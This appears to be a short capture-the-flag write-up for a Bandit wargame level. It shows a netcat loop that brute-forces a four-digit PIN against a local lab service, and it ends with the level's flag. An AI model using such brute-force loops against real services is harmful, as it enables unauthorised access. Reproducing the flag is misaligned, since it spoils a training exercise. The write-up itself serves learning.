\#Bandit Level 24 → Level 25
##Objective

Brute-force PIN using netcat.

\##Commands Used
for i in {0000..9999}; do echo "$i password" | nc localhost 30002; done

Level 24 → Level 25

\##Explanation

A service required a 4-digit PIN.

I brute-forced all combinations using a loop and netcat.

\##Result

Learned brute-force automation.

Flag:iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

